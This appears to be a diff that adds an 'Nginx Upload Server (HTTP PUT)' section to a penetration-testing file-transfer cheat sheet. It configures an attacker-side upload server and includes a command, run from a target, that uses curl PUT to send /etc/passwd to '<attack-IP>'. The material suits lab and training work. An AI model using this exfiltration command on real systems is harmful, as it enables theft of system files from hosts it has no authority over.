@@ -104,6 +104,42 @@ curl <target-IP>:8000/file.txt -o file.txt
 
 ---
 
+### Nginx Upload Server (HTTP PUT)
+
+Better than Apache for this — no PHP execution risk, directory listing off by default.
+
+```bash
+# Create upload directory
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+
+# Create config: /etc/nginx/sites-available/upload.conf
+# server {
+#     listen 9001;
+#     location /SecretUploadDirectory/ {
+#         root    /var/www/uploads;
+#         dav_methods PUT;
+#     }
+# }
+
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+sudo rm /etc/nginx/sites-enabled/default   # remove default if port 80 conflict
+sudo systemctl restart nginx.service
+tail -2 /var/log/nginx/error.log           # check for errors
+```
+
+```bash
+# Upload via curl PUT (from target)
+curl -T /etc/passwd http://<attack-IP>:9001/SecretUploadDirectory/users.txt
+
+# Verify received
+sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
+```
+
+> Use a non-obvious directory name — Nginx won't list directory contents by default, but don't rely on that.
+
+---
+
 ## Quick Reference
 
 | Method | Direction | Needs Network | Notes |
